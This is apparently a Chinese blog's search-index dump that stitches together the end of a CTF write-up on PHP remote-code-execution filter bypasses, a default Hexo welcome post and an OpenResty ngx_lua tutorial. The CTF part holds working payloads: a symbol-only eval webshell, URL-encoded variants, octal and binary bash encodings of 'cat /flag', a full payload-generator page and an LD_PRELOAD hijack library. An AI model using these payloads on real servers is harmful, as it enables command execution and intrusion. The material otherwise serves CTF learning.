$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $____.=$__;$_=$$____;$___($_[_]); \n这个是需要抓换url编码的，转换后如下\n%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%20%24_%3D%24_%5B&#x27;!&#x27;%3D%3D&#x27;%40&#x27;%5D%3B%20%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%20%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%20%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%20%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%20%24___.%3D%24__%3B%24____%3D&#x27;_&#x27;%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%20%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%20%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%20%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___(%24_%5B_%5D)%3B%20\n无$_绕过&lt;?phperror_reporting(0);highlight_file(__FILE__);if (!preg_match(&quot;/a-z0-9$_/is&quot;, $cmd)) &#123;    eval($cmd);&#125;?&gt;\n这道题目是不允许a-z大小写，0-9然后是$_都不可用，这种一般出现在php7中，因为php7可以这样执行命令($a)()，我们完全通过异或或者取反的方式构造一个这种的exp(system)((post)(_))这样的形式，具体的其实就直接参考上面几种方法，通用的exp如下\n// `assert(eval($_POST[mochu7]))`(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%92%90%9C%97%8A%C8%A2%D6%D6);\n进制形式绕过遇到过的一般是8进制和2进制的，其他的一般可以用其他办法绕过，这里就单独说一下8进制和2进制，一般8进制的过滤长这样\n&lt;?phpfunction hello_shell($cmd)&#123;    if(preg_match(&quot;/[A-Za-z\\&quot;%*+,-.\\/:;=&gt;?@[\\]^`|]/&quot;, $cmd))&#123;        die(&quot;WAF!&quot;);    &#125;    system($cmd);&#125;isset($_GET[&#x27;cmd&#x27;]) ? hello_shell($_GET[&#x27;cmd&#x27;]) : null;highlight_file(__FILE__);?&gt;\n可以看到除了数字和\\、$基本都被过滤了，这种的就可以尝试8进制了，而且他这个是可以直接system执行的，就是只要bash能解析即可，bash本身就可以解析8进制的内容，例如在终端中执行$&#39;\\154\\163\\40\\55\\154&#39;就是执行ls -l，然后cat /flag就是\n$&#x27;\\143\\141\\164\\40\\57\\146\\154\\141\\147&#x27;\n二进制的题目长这样\n&lt;?phpfunction hello_shell($cmd)&#123;    if(preg_match(&quot;/[A-Za-z2-9\\&quot;%*+,-.\\/:;=&gt;?@[\\]^`|]/&quot;, $cmd))&#123;        die(&quot;WAF!&quot;);    &#125;    system($cmd);&#125;isset($_GET[&#x27;cmd&#x27;]) ? hello_shell($_GET[&#x27;cmd&#x27;]) : null;highlight_file(__FILE__);?&gt;\n直接从数字中就可以看到是01可用$可用，还有一些其他的符号，这种可以考虑一下二进制了，毕竟0和1可以用，大致就是在提示你01了，具体利用的payload如下\n$0&lt;&lt;&lt;$0\\&lt;\\&lt;\\&lt;\\$\\&#x27;\\\\$(($((1&lt;&lt;1))#10001111))\\\\$(($((1&lt;&lt;1))#10001101))\\\\$(($((1&lt;&lt;1))#10100100))\\\\$(($((1&lt;&lt;1))#101000))\\\\$(($((1&lt;&lt;1))#111001))\\\\$(($((1&lt;&lt;1))#10010010))\\\\$(($((1&lt;&lt;1))#10011010))\\\\$(($((1&lt;&lt;1))#10001101))\\\\$(($((1&lt;&lt;1))#10010011))\\&#x27;\n转换url编码\n%240%3C%3C%3C%240%5C%3C%5C%3C%5C%3C%5C%24%5C%27%5C%5C%24%28%28%24%28%281%3C%3C1%29%29%2310001111%29%29%5C%5C%24%28%28%24%28%281%3C%3C1%29%29%2310001101%29%29%5C%5C%24%28%28%24%28%281%3C%3C1%29%29%2310100100%29%29%5C%5C%24%28%28%24%28%281%3C%3C1%29%29%23101000%29%29%5C%5C%24%28%28%24%28%281%3C%3C1%29%29%23111001%29%29%5C%5C%24%28%28%24%28%281%3C%3C1%29%29%2310010010%29%29%5C%5C%24%28%28%24%28%281%3C%3C1%29%29%2310011010%29%29%5C%5C%24%28%28%24%28%281%3C%3C1%29%29%2310001101%29%29%5C%5C%24%28%28%24%28%281%3C%3C1%29%29%2310010011%29%29%5C%27\n直接给一个通用exp,可以生成很多比较奇怪的符号的脚本，包括上面二进制的脚本你也这个脚本生成的\n&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;BashFuck Payload Generator&lt;/title&gt;    &lt;style&gt;        body &#123;            font-family: Arial, sans-serif;            margin: 20px;            background-color: #f4f4f9;            color: #333;        &#125;        h1 &#123;            color: #333;        &#125;        .input-container, .output-container &#123;            margin-bottom: 20px;        &#125;        textarea, .output-container textarea &#123;            width: 100%;            padding: 10px;            font-family: monospace;            border: 2px solid #4a90e2;            border-radius: 8px;            resize: none;            font-size: 14px;            background-color: #f0f8ff;            outline: none;            box-sizing: border-box;        &#125;        button &#123;            padding: 10px 20px;            font-size: 16px;            background-color: #4a90e2;            color: white;            border: none;            border-radius: 8px;            cursor: pointer;            margin-top: 10px;            box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.2);        &#125;        button:hover &#123;            background-color: #357ab8;        &#125;        .container &#123;            margin-bottom: 30px;            padding: 20px;            background-color: #fff;            border-radius: 10px;            box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.1);            border: 2px solid #ddd;            box-sizing: border-box;        &#125;        .payload-info &#123;            font-weight: bold;            margin-bottom: 10px;            font-size: 14px;        &#125;        .copy-btn &#123;            float: right;            padding: 8px 15px;            background-color: #4a90e2;            color: white;            border: none;            border-radius: 5px;            cursor: pointer;            font-size: 14px;        &#125;        .copy-btn:hover &#123;            background-color: #357ab8;        &#125;        .output-container &#123;            display: flex;            flex-direction: column;        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;BashFuck Payload Generator&lt;/h1&gt;&lt;p&gt;Enter your command below and generate the payloads for all formats.&lt;/p&gt;&lt;div class=&quot;input-container&quot;&gt;    &lt;textarea id=&quot;cmdInput&quot; placeholder=&quot;Enter command here...&quot; rows=&quot;3&quot;&gt;&lt;/textarea&gt;    &lt;button onclick=&quot;generatePayload()&quot;&gt;Generate Payloads&lt;/button&gt;&lt;/div&gt;&lt;div id=&quot;output&quot; class=&quot;output-container&quot;&gt;&lt;/div&gt;&lt;script&gt;function info(s) &#123;    let total = 0;    let usedChars = new Set();    for (let c of s) &#123;        if (c.match(/[ -~]/) &amp;&amp; !usedChars.has(c)) &#123;              total++;            usedChars.add(c);        &#125;    &#125;    return &#123;        charset: Array.from(usedChars).sort().join(&#x27; &#x27;),        totalUsed: total,        payloadLength: s.length,        payload: s    &#125;;&#125;function getOct(c) &#123;    return c.charCodeAt(0).toString(8);  // 将字符的ASCII值转换为八进制字符串&#125;function nomalOtc(cmd) &#123;    let payload = &quot;$&#x27;&quot;;    for (let c of cmd) &#123;        payload += &#x27;\\\\&#x27; + getOct(c);    &#125;    payload += &quot;&#x27;&quot;;    return info(payload);&#125;function bashfuckX(cmd, form) &#123;    let bashStr = &#x27;&#x27;;    for (let c of cmd) &#123;        let binaryStr = parseInt(getOct(c), 10).toString(2);        bashStr += &#x27;\\\\\\\\$(($((1&lt;&lt;1))#&#x27; + binaryStr + &#x27;))&#x27;;    &#125;    let payloadBit = bashStr;    let payloadZero = bashStr.replace(/1/g, &#x27;$&#123;##&#125;&#x27;);  // 用 $&#123;##&#125; 来替换 1    let payloadC = bashStr.replace(/1/g, &#x27;$&#123;##&#125;&#x27;).replace(/0/g, &#x27;$&#123;#&#125;&#x27;);  // 用 $&#123;#&#125; 来替换 0    if (form === &#x27;bit&#x27;) &#123;        payloadBit = &#x27;$0&lt;&lt;&lt;$0\\\\&lt;\\\\&lt;\\\\&lt;\\\\$\\\\\\&#x27;&#x27; + payloadBit + &#x27;\\\\\\&#x27;&#x27;;        return info(payloadBit);    &#125; else if (form === &#x27;zero&#x27;) &#123;        payloadZero = &#x27;$0&lt;&lt;&lt;$0\\\\&lt;\\\\&lt;\\\\&lt;\\\\$\\\\\\&#x27;&#x27; + payloadZero + &#x27;\\\\\\&#x27;&#x27;;        return info(payloadZero);    &#125; else if (form === &#x27;c&#x27;) &#123;        payloadC = &#x27;$&#123;!#&#125;&lt;&lt;&lt;$&#123;!#&#125;\\\\&lt;\\\\&lt;\\\\&lt;\\\\$\\\\\\&#x27;&#x27; + payloadC + &#x27;\\\\\\&#x27;&#x27;;        return info(payloadC);    &#125;&#125;function bashfuckY(cmd) &#123;    let octList = [        &#x27;$(())&#x27;,  // 0        &#x27;$((~$(($((~$(())))$((~$(())))))))&#x27;,  // 1        &#x27;$((~$(($((~$(())))$((~$(())))$((~$(())))))))&#x27;,  // 2        &#x27;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#x27;,  // 3        &#x27;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#x27;,  // 4        &#x27;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#x27;,  // 5        &#x27;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#x27;,  // 6        &#x27;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#x27;,  // 7    ];    let bashFuck = &#x27;&#x27;;    bashFuck += &#x27;__=$(())&#x27;;  // set __ to 0    bashFuck += &#x27;&amp;&amp;&#x27;;  // splicing    bashFuck += &#x27;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\\\\&lt;\\\\&lt;\\\\&lt;\\\\$\\\\\\&#x27;&#x27;;  // got &#x27;sh&#x27;    for (let c of cmd) &#123;        bashFuck += &#x27;\\\\\\\\&#x27;;        for (let i of getOct(c)) &#123;            bashFuck += octList[parseInt(i)];        &#125;    &#125;    bashFuck += &#x27;\\\\\\&#x27;&#x27;;    return info(bashFuck);&#125;function generatePayload() &#123;    const cmd = document.getElementById(&quot;cmdInput&quot;).value;    const outputDiv = document.getElementById(&quot;output&quot;);    outputDiv.innerHTML = &#x27;&#x27;;  // 清空之前的输出    const payloads = [        &#123; title: &#x27;Normal OTC&#x27;, data: nomalOtc(cmd) &#125;,        &#123; title: &#x27;Bit&#x27;, data: bashfuckX(cmd, &#x27;bit&#x27;) &#125;,        &#123; title: &#x27;Zero&#x27;, data: bashfuckX(cmd, &#x27;zero&#x27;) &#125;,        &#123; title: &#x27;C&#x27;, data: bashfuckX(cmd, &#x27;c&#x27;) &#125;,        &#123; title: &#x27;Bashfuck Y&#x27;, data: bashfuckY(cmd) &#125;    ];    payloads.forEach(payload =&gt; &#123;        const container = document.createElement(&#x27;div&#x27;);        container.classList.add(&#x27;container&#x27;);        const info = document.createElement(&#x27;div&#x27;);        info.classList.add(&#x27;payload-info&#x27;);        info.innerHTML = `Charset ($&#123;payload.data.totalUsed&#125;) : $&#123;payload.data.charset&#125;&lt;br&gt;Payload length = $&#123;payload.data.payloadLength&#125;`;        container.appendChild(info);        const textarea = document.createElement(&#x27;textarea&#x27;);        textarea.value = payload.data.payload;        textarea.readOnly = true;        textarea.rows = 4;        container.appendChild(textarea);        const copyButton = document.createElement(&#x27;button&#x27;);        copyButton.classList.add(&#x27;copy-btn&#x27;);        copyButton.innerText = &#x27;Copy&#x27;;        copyButton.onclick = () =&gt; &#123;            textarea.select();            document.execCommand(&#x27;copy&#x27;);        &#125;;        container.appendChild(copyButton);        outputDiv.appendChild(container);    &#125;);&#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\nLD_PRELOAD利用LD_PRELOAD的利用条件比较苛刻，这里列举一下\n可以上传自己的so文件能够控制环境变量的值(设置LD_PRELOAD变量)，比如`putenv`函数并且没有被禁止存在可以控制PHP外部程序的函数并且能够执行,例如mail、imap_mail、mb_send_mail、errlor_log等。\n具体的方法就是通过LD_PRELOAD环境变量来劫持动态链接库。利用的原理参考如下在php的mail函数中存在调用本地软件的内容，具体可以写一个php文件，内容如下\n&lt;?phpmail(&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;);?&gt;\n通过strace -o 1.txt -f php mail.php命令导出运行时的所有系统调用,然后通过查看execve系统调用执行的内容\n┌──(root㉿BoyChaiWindows)-[~/temp/zongjie]└─# cat 1.txt |grep exec5673  execve(&quot;/usr/bin/php&quot;, [&quot;php&quot;, &quot;mail.php&quot;], 0x7fff2e169e40 /* 38 vars */) = 05674  execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;--&quot;, &quot;/usr/sbin/sendmail -t -i&quot;], 0x559f5ab132a0 /* 38 vars */ &lt;unfinished ...&gt;5674  &lt;... execve resumed&gt;)             = 05675  execve(&quot;/usr/sbin/sendmail&quot;, [&quot;/usr/sbin/sendmail&quot;, &quot;-t&quot;, &quot;-i&quot;], 0x558d22e10b68 /* 38 vars */ &lt;unfinished ...&gt;5675  &lt;... execve resumed&gt;)             = 0\n可以发现的是在编号5674中他执行了一个/usr/sbin/sendmail命令，我们通过readelf -Ws /usr/sbin/sendmail命令查看一下他调用了那些动态链接库的函数，这条命令的数据量很大，但是可以找到一个是geteuid的调用，如下\n┌──(root㉿BoyChaiWindows)-[~/temp/zongjie]└─# readelf -Ws /usr/sbin/sendmail|grep geteuid   103: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND geteuid@GLIBC_2.2.5 (4)\n具体的利用方式就是通过在程序运行时的LD_PRELOAD环境变量，他的作用是加载so文件到文件中，如果出现冲突的一些动态链接库函数则有先会使用他的，我们可以手写一个c代码文件，内容如下\n#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void payload() &#123;\tsystem(&quot;cat /flag &gt; /tmp/flag&quot;)&#125;int geteuid()&#123;\tunsetenv(&quot;LD_PRELOAD&quot;);\tpayload();&#125;\n通过gcc -shared -fPIC demo.c -o demo.so命令编译出so文件，上传到服务器中，然后运行下面的php代码\n&lt;?phpputenv(&quot;LD_PRELOAD=./demo.so&quot;)mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;)?&gt;\n去访问这个php代码，或者运行这个php代码的时候就会执行咱们再C代码中的命令，至于为什么需要在C代码中执行unsetenv(&quot;LD_PRELOAD&quot;);是因为咱们改的是环境变量，如果不修改会影响其他程序，有可能会导致系统崩溃，然后当前的绕过思路是任何环境都可以尝试，但是出现问题的话会很危险，因为他劫持了动态链接库，也可以找一个调用量比较少的函数去劫持，然后影响的更少一些。这个的利用在CTF中应该会比较少见，因为他可能导致Docker崩溃，而且利用环境比较苛刻。\n","categories":["CTF相关","WEB"],"tags":["CTF","WEB","PHP","RCE"]},{"title":"Hello World","url":"/2025/04/28/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"ngx_lua模块学习","url":"/2024/04/25/ngx_lua%E6%A8%A1%E5%9D%97%E5%AD%A6%E4%B9%A0/","content":"概述淘宝开发的ngx_lua模块通过将lua解释器解释器集成Nginx，可以采用lua脚本实现业务逻辑，由于lua的紧凑、快速以及内建协程，所以在保证高并发服务能力的同时极大降低了业务逻辑实现成本。\n安装方式1(已弃用)lua-nginx-moduleLuaJIT是采用C语言编写的Lua代表的解释器。官网: http://luajit.org在官网找到对应下载地址: https://github.com/LuaJIT/LuaJIT/tags\n[root@work env]# wget https://github.com/LuaJIT/LuaJIT/archive/refs/tags/v2.0.5.tar.gz[root@work env]# tar xvf v2.0.5.tar.gz [root@work env]# cd LuaJIT-2.0.5/[root@work LuaJIT-2.0.5]# make &amp;&amp; make installmake[1]: Leaving directory &#x27;/opt/env/LuaJIT-2.0.5/src&#x27;==== Successfully built LuaJIT 2.0.5 ======== Installing LuaJIT 2.0.5 to /usr/local ====mkdir -p /usr/local/bin /usr/local/lib /usr/local/include/luajit-2.0 /usr/local/share/man/man1 /usr/local/lib/pkgconfig /usr/local/share/luajit-2.0.5/jit /usr/local/share/lua/5.1 /usr/local/lib/lua/5.1cd src &amp;&amp; install -m 0755 luajit /usr/local/bin/luajit-2.0.5cd src &amp;&amp; test -f libluajit.a &amp;&amp; install -m 0644 libluajit.a /usr/local/lib/libluajit-5.1.a || :rm -f /usr/local/bin/luajit /usr/local/lib/libluajit-5.1.so.2.0.5 /usr/local/lib/libluajit-5.1.so /usr/local/lib/libluajit-5.1.so.2cd src &amp;&amp; test -f libluajit.so &amp;&amp; \\  install -m 0755 libluajit.so /usr/local/lib/libluajit-5.1.so.2.0.5 &amp;&amp; \\  ldconfig -n /usr/local/lib &amp;&amp; \\  ln -sf libluajit-5.1.so.2.0.5 /usr/local/lib/libluajit-5.1.so &amp;&amp; \\  ln -sf libluajit-5.1.so.2.0.5 /usr/local/lib/libluajit-5.1.so.2 || :cd etc &amp;&amp; install -m 0644 luajit.1 /usr/local/share/man/man1cd etc &amp;&amp; sed -e &quot;s|^prefix=.*|prefix=/usr/local|&quot; -e &quot;s|^multilib=.*|multilib=lib|&quot; luajit.pc &gt; luajit.pc.tmp &amp;&amp; \\  install -m 0644 luajit.pc.tmp /usr/local/lib/pkgconfig/luajit.pc &amp;&amp; \\  rm -f luajit.pc.tmpcd src &amp;&amp; install -m 0644 lua.h lualib.h lauxlib.h luaconf.h lua.hpp luajit.h /usr/local/include/luajit-2.0cd src/jit &amp;&amp; install -m 0644 bc.lua v.lua dump.lua dis_x86.lua dis_x64.lua dis_arm.lua dis_ppc.lua dis_mips.lua dis_mipsel.lua bcsave.lua vmdef.lua /usr/local/share/luajit-2.0.5/jitln -sf luajit-2.0.5 /usr/local/bin/luajit==== Successfully installed LuaJIT 2.0.5 to /usr/local ====\n\nlua-nginx-modulenginx第三方模块lua-nginx-module官网: https://github.com/openresty/lua-nginx-module\n[root@work env]# wget https://github.com/openresty/lua-nginx-module/archive/refs/tags/v0.10.26.tar.gz[root@work env]# tar xvf v0.10.26.tar.gz [root@work env]# ln -s lua-nginx-module-0.10.26 lua-nginx-module\n环境变量设置[root@work ~]# tail -n2 /etc/profileexport LUAJIT_LIB=/usr/local/libexport LUAJIT_INC=/usr/local/include/luajit-2.0[root@work ~]# source /etc/profile\n扩展nginx模块打开nginx编译安装的位置 进行重新编译安装\n[root@work nginx-1.24.0]# ./configure  --prefix=/usr/local/nginx  --sbin-path=/usr/local/nginx/sbin/nginx --conf-path=/usr/local/nginx/conf/nginx.conf --error-log-path=/var/log/nginx/error.log  --http-log-path=/var/log/nginx/access.log  --pid-path=/var/run/nginx/nginx.pid --lock-path=/var/lock/nginx.lock  --user=nginx --group=nginx --with-http_ssl_module --with-http_stub_status_module --with-http_gzip_static_module --http-client-body-temp-path=/var/tmp/nginx/client/ --http-proxy-temp-path=/var/tmp/nginx/proxy/ --http-fastcgi-temp-path=/var/tmp/nginx/fcgi/ --http-uwsgi-temp-path=/var/tmp/nginx/uwsgi --http-scgi-temp-path=/var/tmp/nginx/scgi --with-pcre --add-module=/opt/package/nginx/lua-nginx-module[root@work nginx-1.24.0]# make &amp;&amp; make install\n扩展的重点是--with-pcre --add-module=/opt/package/nginx/lua-nginx-module这里就相当于重新安装了，之前安装的模块还需要再这里再添加一遍\n错误libluajit-5.1.so.2当在扩展号nginx模块后执行nginx相关命令出现以下错误\n[root@work ~]# nginx -Vnginx: error while loading shared libraries: libluajit-5.1.so.2: cannot open shared object file: No such file or directory\n这个错误表明 Nginx 在启动时无法找到名为 libluajit-5.1.so.2 的共享库文件。这很可能是由于 Nginx 模块依赖 LuaJIT 库，但系统中缺少了该库所致。解决办法如下\n[root@work ~]# ln -s /usr/local/lib/libluajit-5.1.so.2 /lib64/liblua-5.1.so.2\nreason: module ‘resty.core’ not found[root@work conf]# nginxnginx: [alert] detected a LuaJIT version which is not OpenResty&#x27;s; many optimizations will be disabled and performance will be compromised (see https://github.com/openresty/luajit2 for OpenResty&#x27;s LuaJIT or, even better, consider using the OpenResty releases from https://openresty.org/en/download.html)nginx: [alert] failed to load the &#x27;resty.core&#x27; module (https://github.com/openresty/lua-resty-core); ensure you are using an OpenResty release from https://openresty.org/en/download.html (reason: module &#x27;resty.core&#x27; not found:\tno field package.preload[&#x27;resty.core&#x27;]\tno file &#x27;./resty/core.lua&#x27;\tno file &#x27;/usr/local/share/luajit-2.0.5/resty/core.lua&#x27;\tno file &#x27;/usr/local/share/lua/5.1/resty/core.lua&#x27;\tno file &#x27;/usr/local/share/lua/5.1/resty/core/init.lua&#x27;\tno file &#x27;./resty/core.so&#x27;\tno file &#x27;/usr/local/lib/lua/5.1/resty/core.so&#x27;\tno file &#x27;/usr/local/lib/lua/5.1/loadall.so&#x27;\tno file &#x27;./resty.so&#x27;\tno file &#x27;/usr/local/lib/lua/5.1/resty.so&#x27;\tno file &#x27;/usr/local/lib/lua/5.1/loadall.so&#x27;) in /usr/local/nginx/conf/nginx.conf:117\n\n原因似乎是缺少lua-resty-core模块，这里手动编译安装一下项目地址： https://github.com/openresty/lua-resty-core\n[root@work nginx]# tar xvf v0.1.28.tar.gz tar xvfmake install\n安装方式2概述直接使用OpenRestry，它是由淘宝工程师开发的，它是基于Nginx与Lua的高性能Web平台，其内部集成了大量精良的Lua库，第三方模块以及大多数的依赖项，用于方便搭建能够处理高并发、扩展性极高的动态Web应用、Web服务和动态网关。所以本身OpenResty内部就已经集成了Nginx和Lua，我们用起来会更加方便\n安装参考： https://openresty.org/cn/linux-packages.html配置：&#x2F;usr&#x2F;local&#x2F;openrestry&#x2F;nginx&#x2F;conf\n关于OpenRestryOpenRestry，它是由淘宝工程师开发的，它是基于Nginx与Lua的高性能Web平台，其内部集成了大量精良的Lua库，第三方模块以及大多数的依赖项，用于方便搭建能够处理高并发、扩展性极高的动态Web应用、Web服务和动态网关。所以本身OpenResty内部就已经集成了Nginx和Lua，我们用起来会更加方便。PS：本文只讲ngx_lua的使用，其他的基本和nginx配置无区别。\nngx_lua相关指令块使用Lua编写Nginx脚本的基本构建块是指令。指令用于指定何时运行用户Lua代码以及如何使用结果。下图显示了执行指令的顺序。\n先来解释一下*的作用\n*：无 ， 即 xxx_by_lua ,指令后面跟的是 lua指令*:_file，即 xxx_by_lua_file 指令后面跟的是 lua文件*:_block,即 xxx_by_lua_block 在0.9.17版后替换init_by_lua_file\ninit_by_lua*该指令在每次Nginx重新加载配置时执行，可以用来完成一些耗时模块的加载，或者初始化一些全局配置。\ninit_worker_by_lua*该指令用于启动一些定时任务，如心跳检查、定时拉取服务器配置等。\nset_by_lua*该指令只要用来做变量赋值，这个指令一次只能返回一个值，并将结果赋值给Nginx中指定的变量。\nrewrite_by_lua*该指令用于执行内部URL重写或者外部重定向，典型的如伪静态化URL重写，本阶段在rewrite处理阶段的最后默认执行。\naccess_by_lua*该指令用于访问控制。例如，如果只允许内网IP访问。\ncontent_by_lua*该指令是应用最多的指令，大部分任务是在这个阶段完成的，其他的过程往往为这个阶段准备数据，正式处理基本都在本阶段。\nheader_filter_by_lua*该指令用于设置应答消息的头部信息。\nbody_filter_by_lua*该指令是对响应数据进行过滤，如截断、替换。\nlog_by_lua*该指令用于在log请求处理阶段，用Lua代码处理日志，但并不替换原有log处理。\nbalancer_by_lua*该指令主要的作用是用来实现上游服务器的负载均衡器算法\nssl_certificate_by_*该指令作用在Nginx和下游服务开始一个SSL握手操作时将允许本配置项的Lua代码。\n案例1需求输出内容\n配置location /lua &#123;          default_type &#x27;text/html&#x27;;          content_by_lua &#x27;ngx.say(&quot;&lt;h1&gt;HELLO,OpenResty&lt;/h1&gt;&quot;)&#x27;;      &#125;\n案例2需求http://xxx/?name=张三&amp;gender=1Nginx接收到请求后根据gender传入的值，如果是gender传入的是1，则展示张三先生，如果是0则展示张三女士，如果都不是则展示张三。\n配置location /getByGender &#123;              default_type &#x27;text/html&#x27;;              set_by_lua $param &quot;                      -- 获取请求URL上的参数对应的值                      local uri_args = ngx.req.get_uri_args()                      local name = uri_args[&#x27;name&#x27;]                      local gender = uri_args[&#x27;gender&#x27;]                      -- 条件判断 if gender 1 先生 0 女士                      if gender == &#x27;1&#x27; then                              return name..&#x27;先生&#x27;                      elseif gender == &#x27;0&#x27; then                              return name..&#x27;女士&#x27;                      else                              return name                      end              &quot;;              # 解决中文乱码              charset utf-8;              # 返回数据              return 200 $param;      &#125;\nngx.req.get_uri_args()返回的是一个table类型\n案例3需求动态获取docker容器ip，做代理\n配置server&#123;         listen       80;         server_name  code.boychai.xyz;         client_max_body_size 4096M;\t set_by_lua $param &#x27;         \tlocal name = &quot;gitea&quot;                local port = &quot;3000&quot;                local command = string.format(&quot;echo -n `docker inspect --format=\\&#x27;&#123;&#123;range .NetworkSettings.Networks&#125;&#125;&#123;&#123;.IPAddress&#125;&#125;&#123;&#123;end&#125;&#125;\\&#x27; %s`&quot;, name)                local handle = io.popen(command)                local result = handle:read(&quot;*a&quot;)                handle:close()                return &quot;http://&quot;..result..&quot;:&quot;..port\t &#x27;;         location / &#123;                if ( $param = &#x27;http://:3000&#x27; ) &#123;                        return 500 &quot;Error in obtaining site IP&quot;;                &#125;\t        proxy_pass \t$param;\t\t        proxy_set_header \tHost $proxy_host;                proxy_set_header        X-Real-IP $remote_addr;                proxy_set_header \tX-Forwarded-For $proxy_add_x_forwarded_for;         